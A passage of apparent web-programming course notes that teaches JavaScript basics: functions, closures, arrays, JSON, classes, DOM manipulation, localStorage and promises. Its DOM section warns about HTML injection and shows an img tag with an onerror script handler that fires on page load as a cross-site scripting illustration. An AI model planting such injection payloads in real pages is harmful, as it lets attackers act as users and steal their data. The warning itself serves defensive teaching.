// OUTPUT: example:조선글

Functions
📖 Deeper dive reading: MDN Functions

In JavaScript functions are first class objects. That means that they can be assigned a name, passed as a parameter, returned as a result, and referenced from an object or array just like any other variable.

The basic syntax of a function begins with the function keyword followed by zero or more parameters and a body that may contain zero or more return statements. The return statement may return a single value. Note that there are no type declarations, as the type is always inferred by the assignment of the value to the parameter.

function hello(who) {
  return 'hello ' + who;
}

console.log(hello('world'));
// OUTPUT: hello world
A function without a return value usually exists to produce some side effect like modifying a parameter or interacting with an external program. In the following example the side effect of the function is to output text to the debugger console.

function hello(who) {
  who.count++;
  console.log('hello ' + who.name);
}

hello({ name: 'world', count: 0 });
// OUTPUT: hello world
Function parameters
When a function is called, the caller may choose what parameters to provide. If a parameter is not provided then the value of the parameter is undefined when the function executes.

In addition to explicitly passing the value of a parameter to a function, the function can define a default value. This is done by assigning a value to the parameter in the function declaration.

function labeler(value, title = 'title') {
  console.log(`${title}=${value}`);
}

labeler();
// OUTPUT: title=undefined

labeler('fish');
// OUTPUT: title=fish

labeler('fish', 'animal');
// OUTPUT: animal=fish
Anonymous functions
Functions in JavaScript are commonly assigned to a variable so that they can be passed as a parameter to some other function or stored as an object property. To easily support this common use you can define a function anonymously and assign it to a variable.

// Function that takes a function as a parameter
function doMath(operation, a, b) {
  return operation(a, b);
}

// Anonymous function assigned to a variable
const add = function (a, b) {
  return a + b;
};

console.log(doMath(add, 5, 3));
// OUTPUT: 8

// Anonymous function assigned to a parameter
console.log(
  doMath(
    function (a, b) {
      return a - b;
    },
    5,
    3
  )
);
// OUTPUT: 2
Creating, passing, and returning functions
Here are examples of assigning functions to variables, as well as using functions as parameters and return values.

// Anonymous declaration of the function that is later assigned to a variable
const add = function (a, b) {
  return a + b;
};

// Function that logs as a side effect of its execution
function labeler(label, value) {
  console.log(label + '=' + value);
}

// Function that takes a function as a parameter and then executes the function as a side effect
function addAndLabel(labeler, label, adder, a, b) {
  labeler(label, adder(a, b));
}

// Passing a function to a function
addAndLabel(labeler, 'a+b', add, 1, 3);
// OUTPUT: a+b=4

// Function that returns a function
function labelMaker(label) {
  return function (value) {
    console.log(label + '=' + value);
  };
}

// Assign a function from the return value of the function
const nameLabeler = labelMaker('name');

// Calling the returned function
nameLabeler('value');
// OUTPUT: name=value
Inner functions
Functions can also be declared inside other functions. This allows you to modularize your code without always exposing private details.

function labeler(value) {
  function stringLabeler(value) {
    console.log('string=' + value);
  }
  function numberLabeler(value) {
    console.log('number=' + value);
  }

  if (typeof value == 'string') {
    stringLabeler(value);
  } else if (typeof value == 'number') {
    numberLabeler(value);
  }
}

labeler(5);
// OUTPUT: number=5

labeler('fish');
// OUTPUT: string=fish

JavaScript arrow function
Because functions are first order objects in JavaScript they can be declared anywhere and passed as parameters. This results in code with lots of anonymous functions cluttering things up. To make the code more compact the arrow syntax was created. This syntax replaces the need for the function keyword with the symbols => placed after the parameter declaration. The enclosing curly braces are also optional.

This is a function in arrow syntax that takes no parameters and always returns 3.

() => 3;
The following two invocations of sort are equivalent.

const a = [1, 2, 3, 4];

// standard function syntax
a.sort(function (v1, v2) {
  return v1 - v2;
});

// arrow function syntax
a.sort((v1, v2) => v1 - v2);
Besides being compact, the arrow function syntax has some important semantic differences from the standard function syntax. This includes restrictions that arrow functions cannot be used for constructors or iterator generators.

Return values
Arrow functions also have special rules for the return keyword. The return keyword is optional if no curly braces are provided for the function and it contains a single expression. In that case the result of the expression is automatically returned. If curly braces are provided then the arrow function behaves just like a standard function.

() => 3;
// RETURNS: 3

() => {
  3;
};
// RETURNS: undefined

() => {
  return 3;
};
// RETURNS: 3
This pointer
Next, arrow functions inherit the this pointer from the scope of where it is created. This makes what is known as a closure. A closure allows a function to continue referencing its creation scope, even after it has passed out of that scope. This can be tricky to wrap your head around, and we discuss it in detail when we later talk about JavaScript scope. For now consider the following example.

The function makeClosure returns an anonymous function using the arrow syntax. Notice that the a parameter is overridden, a new b variable is created, and both a and b are referenced in the arrow function. Because of that reference, they are both part of the closure for the returned function.

function makeClosure(a) {
  a = 'a2';
  const b = 'b2';
  return () => [a, b];
}
Next, we declare the variables a and b at the top level scope, and call makeClosure with a.

const a = 'a';
const b = 'b';

const closure = makeClosure(a);
Now, when we call closure function it will output the values contained in scope where it was created instead of the current values of the variables.

console.log(closure());
// OUTPUT: ['a2', 'b2']

console.log(a, b);
// OUTPUT: 'a' 'b'
Closures provide a valuable property when we do things like execute JavaScript within the scope of an HTML page, because it can remember the values of variables when the function was created instead of what they are when they are executed.

Putting it all together
Now that you know how functions work in JavaScript, let's look at an example that demonstrates the use of functions, arrow functions, parameters, a function as a parameter (callback), closures, and browser event listeners. This is done by implementing a debounce function.

The point of a debounce function is to only execute a specified function once within a given time window. Any requests to execute the debounce function more frequently than this will case the time window to reset. This is important in cases where a user can trigger expensive events thousands of times per second. Without a debounce the performance of your application can greatly suffer.

The following code calls the browser's window.addEventListener function to add a callback function that is invoked whenever the user scrolls the browser's web page. The first parameter to addEventListener specifies that it wants to listen for scroll events. The second parameter provides the function to call when a scroll event happens. In this case we call a function named debounce.

The debounce function takes two parameters, the time window for executing the window function, and the window function to call within that limit. In this case we will execute the arrow function at most every 500 milliseconds.

window.addEventListener(
  'scroll',
  debounce(500, () => {
    console.log('Executed an expensive calculation');
  })
);
The debounce function implements the execution of windowFunc within the restricted time window by creating a closure that contains the current timeout and returning a function that will reset the timeout every time it is called. The returned function is what the scroll event will actually call when the user scrolls the page. However, instead of directly executing the windowFunc it sets a timer based on the value of windowMs. If the debounce function is called again before the window times out then it resets the timeout.

function debounce(windowMs, windowFunc) {
  let timeout;
  return function () {
    console.log('scroll event');
    clearTimeout(timeout);
    timeout = setTimeout(() => windowFunc(), windowMs);
  };
}
You can experiment with this in CodePen. In this example, the background color will change as long as the user is scrolling. When they stop the background reverts back to white.

JavaScript array
📖 Deeper dive reading: MDN Array

JavaScript array objects represent a sequence of other objects and primitives. You can reference the members of the array using a zero based index. You can create an array with the Array constructor or using the array literal notation shown below.

const a = [1, 2, 3];
console.log(a[1]);
// OUTPUT: 2

console.log(a.length);
// OUTPUT: 3
Object functions
The Array object has several interesting static functions associated with it. Here are some of the interesting ones.

Function	Meaning	Example
push	Add an item to the end of the array	a.push(4)
pop	Remove an item from the end of the array	x = a.pop()
slice	Return a sub-array	a.slice(1,-1)
sort	Run a function to sort an array in place	a.sort((a,b) => b-a)
values	Creates an iterator for use with a for of loop	for (i of a.values()) {...}
find	Find the first item satisfied by a test function	a.find(i => i < 2)
forEach	Run a function on each array item	a.forEach(console.log)
reduce	Run a function to reduce each array item to a single item	a.reduce((a, c) => a + c)
map	Run a function to map an array to a new array	a.map(i => i+i)
filter	Run a function to remove items	a.filter(i => i%2)
every	Run a function to test if all items match	a.every(i => i < 3)
some	Run a function to test if any items match	a.some(i => 1 < 1)
const a = [1, 2, 3];

console.log(a.map((i) => i + i));
// OUTPUT: [2,4,6]
console.log(a.reduce((v1, v2) => v1 + v2));
// OUTPUT: 6
console.log(a.sort((v1, v2) => v2 - v1));
// OUTPUT: [3,2,1]

a.push(4);
console.log(a.length);
// OUTPUT: 4
☑ Assignment
Create a CodePen that defines a function named testAll that takes two parameters. The first parameter is an input array. The second parameter is a tester function that checks all the values of the input array. If the tester function returns true for each value in the input array, then testAll returns true.

Call testAll with an array of strings as the first parameter and an arrow function that returns true if the input has a length greater than 3.

Output the result of the call to testAll with the console.log function.

Here is a template for you to start with.

function testAll(input, tester) {
  const result = // Your code here
  return result
}

const result = testAll(/* Your parameters here */);

console.log(result);
Once you are done coding, submit your CodePen URL to the Canvas assignment.

Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.

🧧 Possible solution
If you get stuck here is a possible solution.

JSON
📖 Deeper dive reading:

MDN JSON
Douglas Crockford: The JSON Saga
JavaScript Object Notation (JSON) was conceived by Douglas Crockford in 2001 while working at Yahoo! JSON, pronounced like the name Jason, received official standardization in 2013 and 2017 (ECMA-404, RFC 8259).

JSON provides a simple, and yet effective way, to share and store data. By design JSON is easily convertible to, and from, JavaScript objects. This make it a very convenient data format when working with web technologies. Because of its simplicity, standardization, and compatibility with JavaScript, JSON has become one of the world's most popular data formats.

Format
A JSON document contains one of the following data types:

Type	Example
string	"crockford"
number	42
boolean	true
array	[null,42,"crockford"]
object	{"a":1,"b":"crockford"}
null	null
Most commonly, a JSON document contains an object. Objects contain zero or more key value pairs. The key is always a string, and the value must be one of the valid JSON data types. Key value pairs are delimited with commas. Curly braces delimit an object, square brackets and commas delimit arrays, and strings are always delimited with double quotes.

Here is an example of a JSON document.

{
  "class": {
    "title": "web programming",
    "description": "Amazing"
  },
  "enrollment": ["Marco", "Jana", "فَاطِمَة"],
  "start": "2025-02-01",
  "end": null
}
JSON is always encoded with UTF-8. This allows for the representation of global data.

Converting to JavaScript
You can convert JSON to, and from, JavaScript using the JSON.parse and JSON.stringify functions.

const obj = { a: 2, b: 'crockford', c: undefined };
const json = JSON.stringify(obj);
const objFromJson = JSON.parse(json);

console.log(obj, json, objFromJson);

// OUTPUT:
// {a: 2, b: 'crockford', c: undefined}
// {"a":2, "b":"crockford"}
// {a: 2, b: 'crockford'}
Note that in this example, JSON cannot represent the JavaScript undefined object and so it gets dropped when converting from JavaScript to JSON.

JavaScript object and classes
📖 Deeper dive reading: MDN Classes in JavaScript

A JavaScript object represents a collection of name value pairs referred to as properties. The property name must be of type String or Symbol, but the value can be of any type. Objects also have common object-oriented functionality such as constructors, a this pointer, static properties and functions, and inheritance.

Objects can be created with the new operator. This causes the object's constructor to be called. Once declared you can add properties to the object by simply referencing the property name in an assignment. Any type of variable can be assigned to a property. This includes a sub-object, array, or function. The properties of an object can be referenced either with dot (obj.prop) or bracket notation (obj['prop']).

const obj = new Object({ a: 3 });
obj['b'] = 'fish';
obj.c = [1, 2, 3];
obj.hello = function () {
  console.log('hello');
};

console.log(obj);
// OUTPUT: {a: 3, b: 'fish', c: [1,2,3], hello: func}
The ability to dynamically modify an object is incredibly useful when manipulating data with an indeterminate structure.

⚠ Note the different uses of the term object. Object can refer to the standard JavaScript objects (e.g. Promise, Map, Object, Function, Date, ...), or it can refer specifically to the JavaScript Object object (i.e. new Object()), or it can refer to any JavaScript object you create (e.g. {a:'a', b:2} ). This overloaded usage can be a bit confusing.

Object-literals
You can also declare a variable of object type with the object-literal syntax. This syntax allows you to provide the initial composition of the object.

const obj = {
  a: 3,
  b: 'fish',
};
Object functions
Object has several interesting static functions associated with it. Here are some of the commonly used ones.

Function	Meaning
entries	Returns an array of key value pairs
keys	Returns an array of keys
values	Returns an array of values
const obj = {
  a: 3,
  b: 'fish',
};

console.log(Object.entries(obj));
// OUTPUT: [['a', 3], ['b', 'fish']]
console.log(Object.keys(obj));
// OUTPUT: ['a', 'b']
console.log(Object.values(obj));
// OUTPUT: [3, 'fish']
Constructor
Any function that returns an object is considered a constructor and can be invoked with the new operator.

function Person(name) {
  return {
    name: name,
  };
}

const p = new Person('Eich');
console.log(p);
// OUTPUT: {name: 'Eich'}
Because objects can have any type of property value you can create methods on the object as part of its encapsulation.

function Person(name) {
  return {
    name: name,
    log: function () {
      console.log('My name is ' + this.name);
    },
  };
}

const p = new Person('Eich');
p.log();
// OUTPUT: My name is Eich
This pointer
Notice in the last example the use of the keyword this when we referred to the name property (this.name). The meaning of this depends upon the scope of where it is used, but in the context of an object it refers to a pointer to the object. We will talk more about the this pointer in the instruction on scope.

Classes
You can use classes to define objects. Using a class clarifies the intent to create a reusable component rather than a one-off object. Class declarations look similar to declaring an object, but classes have an explicit constructor and assumed function declarations. The person object from above would look like the following when converted to a class.

class Person {
  constructor(name) {
    this.name = name;
  }

  log() {
    console.log('My name is ' + this.name);
  }
}

const p = new Person('Eich');
p.log();
// OUTPUT: My name is Eich
You can make properties and functions of classes private by prefixing them with a #.

class Person {
  #name;

  constructor(name) {
    this.#name = name;
  }
}

const p = new Person('Eich');
p.#name = 'Lie';
// OUTPUT: Uncaught SyntaxError: Private field '#name' must be declared in an enclosing class
Inheritance
Classes can be extended by using the extends keyword to define inheritance. Parameters that need to be passed to the parent class are delivered using the super function. Any functions defined on the child that have the same name as the parent override the parent's implementation. A parent's function can be explicitly accessed using the super keyword.

class Person {
  constructor(name) {
    this.name = name;
  }

  print() {
    return 'My name is ' + this.name;
  }
}

class Employee extends Person {
  constructor(name, position) {
    super(name);
    this.position = position;
  }

  print() {
    return super.print() + '. I am a ' + this.position;
  }
}

const e = new Employee('Eich', 'programmer');
console.log(e.print());
// OUTPUT: My name is Eich. I am a programmer

JavaScript regular expressions
📖 Deeper dive reading: MDN Regular expressions

Regular expression support is built right into JavaScript. If you are not familiar with regular expressions, you can think of them as textual pattern matchers. You use a regular expression to find text in a string so that you can replace it, or simply to know that it exists.

You can create a regular expression using the class constructor or a regular expression literal.

const objRegex = new RegExp('ab*', 'i');
const literalRegex = /ab*/i;
The string class has several functions that accept regular expressions. This includes match, replace, search, and split. For a quick test to see if there is a match you can use the regular expression object's test function.

const petRegex = /(dog)|(cat)|(bird)/gim;
const text = 'Both cats and dogs are pets, but not rocks.';

text.match(petRegex);
// RETURNS: ['cat', 'dog']

text.replace(petRegex, 'animal');
// RETURNS: Both animals and animals are pets, but not rocks.

petRegex.test(text);
// RETURNS: true

JavaScript rest and spread
📖 Deeper dive reading:

MDN Rest
MDN Spread
Rest
Sometimes you want a function to take an unknown number of parameters. For example, if you wanted to write a function that checks to see if some number in a list is equal to a given number, you could write this using an array.

function hasNumber(test, numbers) {
  return numbers.some((i) => i === test);
}

const a = [1, 2, 3];
hasNumber(2, a);
// RETURNS: true
However sometimes you don't have an array to work with. In this case you could create one on the fly.

function hasTwo(a, b, c) {
  return hasNumber(2, [a, b, c]);
}
But JavaScript provides the rest syntax to make this easier. Think of it as a parameter that contains the rest of the parameters. To turn the last parameter of any function into a rest parameter you prefix it with three periods. You can then call it with any number of parameters and they are all automatically combined into an array.

function hasNumber(test, ...numbers) {
  return numbers.some((i) => i === test);
}

hasNumber(2, 1, 2, 3);
// RETURNS: true
Note that you can only make the last parameter a rest parameter. Otherwise JavaScript would not know which parameters to combine into the array.

Technically speaking, rest allows JavaScript to provide what is called variadic functions.

Spread
Spread does the opposite of rest. It take an object that is iterable (e.g. array or string) and expands it into a function's parameters. Consider the following.

function person(firstName, lastName) {
  return { first: firstName, last: lastName };
}

const p = person(...['Ryan', 'Dahl']);
console.log(p);
// OUTPUT: {first: 'Ryan', last: 'Dahl'}

JavaScript exceptions
📖 Deeper dive reading: MDN try...catch

JavaScript supports exception handling using the try catch and throw syntax. An exception can be triggered whenever your code generates an exception using the throw keyword, or whenever an exception is generated by the JavaScript runtime, for example, when an undefined variable is used.

To catch a thrown exception, you wrap a code block with the try keyword, and follow the try block with a catch block. If within the try block, including any functions that block calls, an exception is thrown, then all of the code after the throw is ignored, the call stack is unwound, and the catch block is called.

In addition to a catch block, you can specify a finally block that is always called whenever the try block is exited regardless if an exception was ever thrown.

The basic syntax looks like the following.

try {
  // normal execution code
} catch (err) {
  // exception handling code
} finally {
  // always called code
}
For example:

function connectDatabase() {
  throw new Error('connection error');
}

try {
  connectDatabase();
  console.log('never executed');
} catch (err) {
  console.log(err);
} finally {
  console.log('always executed');
}

// OUTPUT: Error: connection error
//         always executed
⚠ When first using exception handling it is tempting to use it as way to handle normal flows of execution. For example, throwing a file not found exception when it is common for users to request nonexistent files. Throwing exceptions should only happen when something truly exceptional occurs. For example, a file not found exception when the file is required for your code to run, such as a required configuration file. Your code will be easier to debug, and your logs more meaningful if you restrict exceptions to truly exceptional situations.

Fallbacks
The fallback pattern is commonly implemented using exception handling. To implement the fallback pattern you put the normal feature path in a try block and then provide a fallback implementation in the catch block. For example, normally you would get the high scores for a game by making a network request, but if the network is not available then a locally cached version of the last available scores is used. By providing a fallback, you can always return something, even if the desired feature is temporarily unavailable.

function getScores() {
  try {
    const scores = scoringService.getScores();
    // store the scores so that we can use them later if the network is not available
    window.localStorage.setItem('scores', scores);
    return scores;
  } catch {
    return window.localStorage.getItem('scores');
  }
}

JavaScript destructuring
📖 Deeper dive reading: MDN Destructuring

Destructuring, not to be confused with destructing, is the process of pulling individual items out of an existing one, or removing structure. You can do this with either arrays or objects. This is helpful when you only care about a few items in the original structure.

An example of destructuring arrays looks like the following.

const a = [1, 2, 4, 5];

// destructure the first two items from a, into the new variables b and c
const [b, c] = a;

console.log(b, c);
// OUTPUT: 1, 2
Note that even though it looks like you are declaring an array with the syntax on the left side of the expression, it is only specifying that you want to destructure those values out of the array.

You can also combine multiple items from the original object using rest syntax.

const [b, c, ...others] = a;

console.log(b, c, others);
// OUTPUT: 1, 2, [4,5]
This works in a similar manner for objects, except with arrays, the assignment of the associated value was assumed by the positions in the two arrays. When destructuring objects, you explicitly specify the properties you want to pull from the source object.

const o = { a: 1, b: 'animals', c: ['fish', 'cats'] };

const { a, c } = o;

console.log(a, c);
// OUTPUT 1, ['fish', 'cats']
You can also map the names to new variables instead of just using the original property names.

const o = { a: 1, b: 'animals', c: ['fish', 'cats'] };

const { a: count, b: type } = o;

console.log(count, type);
// OUTPUT 1, animals
Default values may also be provided for missing ones.

const { a, b = 22 } = {};
const [c = 44] = [];

console.log(a, b, c);
// OUTPUT: undefined, 22, 44
Note that all of the above examples created new constant variables, but you can also use destructuring to reassign existing variables.

let a = 22;

[a] = [1, 2, 3];

console.log(a);
// OUTPUT: 1

Scope
📖 Deeper dive reading:

MDN Scope
MDN this
MDN Closures
Understanding JavaScript scope is essential for making your programs run as you expect. Scope is defined as the variables that are visible in the current context of execution. JavaScript has four different types of scope:

Global - Visible to all code
Module - Visible to all code running in a module
Function - Visible within a function
Block - Visible within a block of code delimited by curly braces
Var
Initially JavaScript used the keyword var to declare a variable. The problem with var, unlike const or let, is that it ignores block scope. Variables declared with var are always logically hoisted to the top of the function. For example, the following code shows the same variable name being used within different enclosing scopes. However, because var ignores block scope the for loop is simply assigning a new value to x rather than declaring a new variable that has the same name.

var x = 10;
console.log('start', x);

for (var x = 0; x < 1; x++) {
  console.log('middle', x);
}

console.log('end', x);

// OUTPUT: start 10
//         middle 0
//         end 1
⚠ There are few cases where it makes sense to use var. It is strongly suggested that you only use const and let unless you fully understand why you are using var.

This
The keyword this represents a variable that points to an object that contains the context within the scope of the currently executing line of code. The this variable is automatically declared and you can reference this anywhere in a JavaScript program. Because the value of this depends upon the context in which it is referenced, there are three different context that this can refer to:

Global - When this is referenced outside a function or object it refers to the globalThis object. The globalThis object represents the context for runtime environment. For example, when running in a browser, globalThis refers to the browser's window object.
Function - When this is referenced in a function it refers to the object that owns the function. That is either an object you defined or globalThis if the function is defined outside of an object. Note that when running in JavaScript strict mode, a global function's this variable is undefined instead of globalThis.
Object - When this is referenced in an object it refers to the object.
'use strict';

// global scope
console.log('global:', this);
console.log('globalThis:', globalThis);

// function scope for a global function
function globalFunc() {
  console.log('globalFunctionThis:', this);
}
globalFunc();

// object scope
class ScopeTest {
  constructor() {
    console.log('objectThis:', this);
  }

  // function scope for an object function
  objectFunc() {
    console.log('objectFunctionThis:', this);
  }
}

new ScopeTest().objectFunc();
Running the above code in a browser results in the following.

global: Window
globalThis: Window
globalFunctionThis: undefined
objectThis: ScopeTest
objectFunctionThis: ScopeTest
Note that if we were not using JavaScript strict mode then globalFunctionThis would refer to Window.

Closure
A closure is defined as a function and its surrounding state. That means whatever variables are accessible when a function is created are available inside that function. This holds true even if you pass the function outside of the scope of its original creation.

Here is an example of a function that is created as part of an object. That means that function has access to the object's this pointer.

globalThis.x = 'global';

const obj = {
  x: 'object',
  f: function () {
    console.log(this.x);
  },
};

obj.f();
// OUTPUT: object
Arrow functions are a bit different because they inherit the this pointer of their creation context. So if we change our previous example to return an arrow function, then the this pointer at the time of creation will be globalThis.

globalThis.x = 'global';

const obj = {
  x: 'object',
  f: () => console.log(this.x),
};

obj.f();
// OUTPUT: global
However, if we make function in our object that returns an arrow function, then the this pointer will be the object's this pointer since that was the active context at the time the arrow function was created.

globalThis.x = 'global';

const obj = {
  x: 'object',
  make: function () {
    return () => console.log(this.x);
  },
};

const f = obj.make();
f();
// OUTPUT: object

JavaScript modules
📖 Deeper dive reading: MDN JavaScript modules

JavaScript modules allow for the partitioning and sharing of code. Initially JavaScript had no support for modules. Node.js, a server side JavaScript execution application, introduced the concept of modules in order to support the importing of packages of JavaScript from third party providers.

JavaScript got full module support with ES6, and they have become the standard module representation as browser support for ES modules is now almost universal.

In order to differentiate between the two implementations, Node.js modules are called CommonJS modules, and JavaScript modules are called ES modules. For this discussion, we will focus only on ES modules.

Because modules create a file-based scope for the code they represent, you must explicitly export the objects from one file and then import them into another file. For example, here is a simple module that exports a function that displays an alert.

alert.js

export function alertDisplay(msg) {
  alert(msg);
}
You can import the module's exported function into another module using the import keyword.

main.js

import { alertDisplay } from './alert.js';

alertDisplay('called from main.js');
ES Modules in the browser
When you use ES modules in the browser via HTML script references, things get a little complicated. The key thing to understand is that modules can only be called from other modules. You cannot access JavaScript contained in a module from the global scope that your non-module JavaScript is executing in.

From your HTML, you can specify that you are using an ES module by including a type attribute with the value of module in the script element. You can then import and use other modules. This is shown in the example below.

index.html

<script type="module">
  import { alertDisplay } from './alert.js';
  alertDisplay('module loaded');
</script>
If we want to use a module in the global scope that our HTML or other non-module JavaScript is executing in, then we must leak it into the global scope. We do this by either attaching an event handler or explicitly adding a function to the global window object. In the example below, we expose the alertDisplay imported module function by attaching it to the global JavaScript window object so that it can then be called from the button onclick handler. We also expose the module function by attaching a keypress event.

index.html

<html>
  <body>
    <script type="module">
      import { alertDisplay } from './alert.js';
      window.btnClick = alertDisplay;

      document.body.addEventListener('keypress', function (event) {
        alertDisplay('Key pressed');
      });
    </script>
    <button onclick="btnClick('button clicked')">Press me</button>
  </body>
</html>
Now, if the button is pushed or a key is pressed our ES module function will be called.

Modules with web frameworks
Fortunately, when you use a web framework bundler, discussed in later instruction, to generate your web application distribution code, you usually don't have to worry about differentiating between global scope and ES module scope. The bundler will inject all the necessary syntax to connect your HTML to your modules. Historically, this was done by removing the modules and placing all of the JavaScript in a namespaced global partition. Now that ES Modules are supported on most browsers, the bundler will expose the ES module directly.

Because of the complex history of modules they can be a confusing topic, but it is well worth the time to understand how they work as they are a core piece of a web programmer's toolkit.

Document Object Model
📖 Deeper dive reading:

MDN Introduction to the DOM
W3C DOM specification - This official specification is only for reference
The Document Object Model (DOM) is an object representation of the HTML elements that the browser uses to render the display. The browser also exposes the DOM to external code so that you can write programs that dynamically manipulate the HTML.

The browser provides access to the DOM through a global variable name document that points to the root element of the DOM. If you open the browser's debugger console window and type the variable name document you will see the DOM for the document the browser is currently rendering.

> document
<html lang="en">
  <body>
    <p>text1 <span>text2</span></p>
    <p>text3</p>
  </body>
</html>
p {
  color: red;
}
For everything in an HTML document there is a node in the DOM. This includes elements, attributes, text, comments, and whitespace. All of these nodes form a big tree, with the document node at the top.

dom

Accessing the DOM
Every element in an HTML document implements the DOM Element interface, which is derived from the DOM Node interface. The DOM Element Interface provides the means for iterating child elements, accessing the parent element, and manipulating the element's attributes. From your JavaScript code, you can start with the document variable and walk through the every element in the tree.

function displayElement(el) {
  console.log(el.tagName);
  for (const child of el.children) {
    displayElement(child);
  }
}

displayElement(document);
You can provide a CSS selector to the querySelectorAll function in order to select elements from the document. The textContent property contains all of the element's text. You can even access a textual representation of an element's HTML content with the innerHTML property.

const listElements = document.querySelectorAll('p');
for (const el of listElements) {
  console.log(el.textContent);
}
Modifying the DOM
The DOM supports the ability to insert, modify, or delete the elements in the DOM. To create a new element you first create the element on the DOM document. You then insert the new element into the DOM tree by appending it to an existing element in the tree.

function insertChild(parentSelector, text) {
  const newChild = document.createElement('div');
  newChild.textContent = text;

  const parentElement = document.querySelector(parentSelector);
  parentElement.appendChild(newChild);
}

insertChild('#courses', 'new course');
To delete elements call the removeChild function on the parent element.

function deleteElement(elementSelector) {
  const el = document.querySelector(elementSelector);
  el.parentElement.removeChild(el);
}

deleteElement('#courses div');
Injecting HTML
The DOM also allows you to inject entire blocks of HTML into an element. The following code finds the first div element in the DOM and replaces all the HTML it contains.

const el = document.querySelector('div');
el.innerHTML = '<div class="injected"><b>Hello</b>!</div>';
However, directly injecting HTML as a block of text is a common attack vector for hackers. If an untrusted party can inject JavaScript anywhere in your application then that JavaScript can represent itself as the current user of the application. The attacker can then make requests for sensitive data, monitor activity, and steal credentials. The example below shows how the img element can be used to launch an attack as soon as the page is loaded.

<img src="bogus.png" onerror="console.log('All your base are belong to us')" />
If you are injecting HTML, make sure that it cannot be manipulated by a user. Common injection paths include HTML input controls, URL parameters, and HTTP headers. Either sanitize any HTML that contains variables, or simply use DOM manipulation functions instead of using innerHTML.

Event Listeners
All DOM elements support the ability to attach a function that gets called when an event occurs on the element. These functions are called event listeners. Here is an example of an event listener that gets called when an element gets clicked.

const submitDataEl = document.querySelector('#submitData');
submitDataEl.addEventListener('click', function (event) {
  console.log(event.type);
});
There are lots of possible events that you can add a listener to. This includes things like mouse, keyboard, scrolling, animation, video, audio, WebSocket, and clipboard events. You can see the full list on MDN. Here are a few of the more commonly used events.

Event Category	Description
Clipboard	Cut, copied, pasted
Focus	An element gets focus
Keyboard	Keys are pressed
Mouse	Click events
Text selection	When text is selected
You can also add event listeners directly in the HTML. For example, here is a onclick handler that is attached to a button.

<button onclick='alert("clicked")'>click me</button>
☑ Assignment
This CodePen dynamically manipulates the DOM using JavaScript. Create a fork of the pen and take some time to experiment with it. Then complete the following:

Add a new table that represents the seven peaks of Utah County.

name: "Timpanogos", height: 11750, quality: 4.8
name: "Santaquin", height: 10687, quality: 3.8
name: "Lone Peak", height: 11253, quality: 5
name: "Provo Peak", height: 11068, quality: 4.1
name: "Cascade", height: 10908, quality: 3.2
name: "Nebo", height: 11928, quality: 4.8
name: "Spanish Fork", height: 10192, quality: 3.4
Sort the table when a header is clicked on

When you are done submit your CodePen URL to the Canvas assignment.

Don't forget to update your GitHub startup repository notes.md with all of the things you learned and want to remember.

🧧 Possible solution
If you get stuck here is a possible solution.

Local storage
📖 Deeper dive reading: MDN LocalStorage

The browser's localStorage API provides the ability to persistently store and retrieve data (i.e. scores, usernames, etc.,) on a user's browser across user sessions and HTML page renderings. For example, your frontend JavaScript code could store a user's name on one HTML page, and then retrieve the name later when a different HTML page is loaded. The user's name will also be available in local storage the next time the same browser is used to access the same website.

In addition to persisting application data between page renderings, localStorage is also used as a cache for when data cannot be obtained from the server. For example, your frontend JavaScript could store the last high scores obtained from the service, and then display those scores in the future if the service is not available.

How to use LocalStorage
There are four main functions that can be used with localStorage.

Function	Meaning
setItem(name, value)	Sets a named item's value into local storage
getItem(name)	Gets a named item's value from local storage
removeItem(name)	Removes a named item from local storage
clear()	Clears all items in local storage
A local storage value must be of type string, number, or boolean. If you want to store a JavaScript object or array, then you must first convert it to a JSON string with JSON.stringify() on insertion, and parse it back to JavaScript with JSON.parse() when retrieved.

Example
Open your startup website and run the following code in the browser's dev tools console window.

let user = 'Alice';

let myObject = {
  name: 'Bob',
  info: {
    favoriteClass: 'CS 260',
    likesCS: true,
  },
};

let myArray = [1, 'One', true];

localStorage.setItem('user', user);
localStorage.setItem('object', JSON.stringify(myObject));
localStorage.setItem('array', JSON.stringify(myArray));

console.log(localStorage.getItem('user'));
console.log(JSON.parse(localStorage.getItem('object')));
console.log(JSON.parse(localStorage.getItem('array')));
Output

Alice
{name: 'Bob', info: {favoriteClass: 'CS 260', likesCS: true}
[1, 'One', true]
Notice that you are able to see the round trip journey of the local storage values in the console output. If you want to see what values are currently set for your application, then open the Application tab of the dev tools and select Storage > Local Storage and then your domain name. With the dev tools you can add, view, update, and delete any local storage values.

Local storage dev tools

Promises
📖 Deeper dive reading:

MDN Using Promises
MDN Promise
The rendering thread of your HTML executes on a single threaded. That means that you cannot take a long time processing JavaScript on the main rendering thread. Long running, or blocking tasks, should be executed with the use of a JavaScript Promise. The execution of a promise allows the main rendering thread to continue while some action is executed in the background. You create a promise by calling the Promise object constructor and passing it an executor function that runs the asynchronous operation. Executing asynchronously means that promise constructor may return before the promise executor function runs. The state of the promise execution is always in one of three states different states.

pending - Currently running asynchronously
fulfilled - Completed successfully
rejected - Failed to complete
We can demonstrate asynchronous execution by using the standard JavaScript setTimeout function to create a delay in the execution of the code. The setTimeout function takes the number of milliseconds to wait and a function to call after that amount of time has expired. We call the delay function in a for loop in the promise executor and also a for loop outside the promise so that both code blocks are running in parallel.

const delay = (msg, wait) => {
  setTimeout(() => {
    console.log(msg, wait);
  }, 1000 * wait);
};

new Promise((resolve, reject) => {
  // Code executing in the promise
  for (let i = 0; i < 3; i++) {
    delay('In promise', i);
  }
});

// Code executing after the promise
for (let i = 0; i < 3; i++) {
  delay('After promise', i);
}

// OUTPUT:
//   In promise 0
//   After promise 0
//   In promise 1
//   After promise 1
//   In promise 2
//   After promise 2
Resolving and rejecting
Now that we know how to use a promise to execute asynchronously, we need to be able to set the state to fulfilled when things complete correctly, or to rejected when an error happens. The promise executor function takes two functions as parameters, resolve and reject. Calling resolve sets the promise to the fulfilled state, and calling reject sets the promise to the rejected state.

Consider the following "coin toss" promise that waits ten seconds and then has a fifty percent chance of resolving or rejecting.

const coinToss = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (Math.random() > 0.5) {
      resolve('success');
    } else {
      reject('error');
    }
  }, 10000);
});
If you log the coinToss promise object to the console immediately after calling the constructor, it will display that it is in the pending state.

console.log(coinToss);
// OUTPUT: Promise {<pending>}
If you then wait ten seconds and the log the coinToss promise object again, the state will either show as fulfilled or rejected depending upon the way the coin landed.

console.log(coinToss);
// OUTPUT: Promise {<fulfilled>}
Then, catch, finally
